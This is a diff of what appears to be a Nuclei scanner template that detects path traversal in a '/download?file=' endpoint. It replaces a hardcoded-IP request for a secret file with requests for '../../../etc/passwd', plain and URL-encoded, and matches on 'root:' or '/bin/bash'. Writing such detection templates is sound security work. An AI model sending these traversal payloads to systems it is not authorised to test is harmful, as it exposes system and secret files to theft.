@@ -1,18 +1,22 @@
 id: ch2-path-traversal
 
 info:
-  name: Sensitive file disclosure via insecure path validation
+  name: Path Traversal - File Download Endpoint
   author: manikanta2834
   severity: high
-  description: Application allows reading files outside the intended directory due to flawed prefix-based path validation
+  description: Detects path traversal in file download endpoint
+  tags: lfi,path-traversal
 
-requests:
+http:
   - method: GET
     path:
-      - "http://172.31.138.39:8002/download?file=../files/../files_evil/secret.txt"
+      - "{{BaseURL}}/download?file=../../../etc/passwd"
+      - "{{BaseURL}}/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
 
     matchers:
       - type: word
         part: body
         words:
-          - "API_KEY="
+          - "root:"
+          - "/bin/bash"
+        condition: or
